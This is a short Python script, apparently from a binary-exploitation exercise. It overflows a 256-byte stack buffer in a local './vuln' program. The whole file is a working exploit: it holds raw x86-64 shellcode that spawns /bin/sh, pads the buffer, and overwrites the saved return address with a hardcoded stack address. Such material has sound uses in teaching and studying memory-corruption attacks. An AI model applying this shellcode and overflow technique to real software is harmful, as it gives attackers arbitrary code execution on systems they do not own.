#!/usr/bin/env python
import struct
import subprocess

# vuln.c buf addr
ret_addr = 0x7fffffffe1b0
ret_addr = 0x7fffffffe0a0

# execve(/bin/sh)
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

buf = shellcode
buf += "A" * (256 + 8 - len(shellcode))
buf += struct.pack("<Q", ret_addr).rstrip("\0")

subprocess.call(["./vuln", buf])
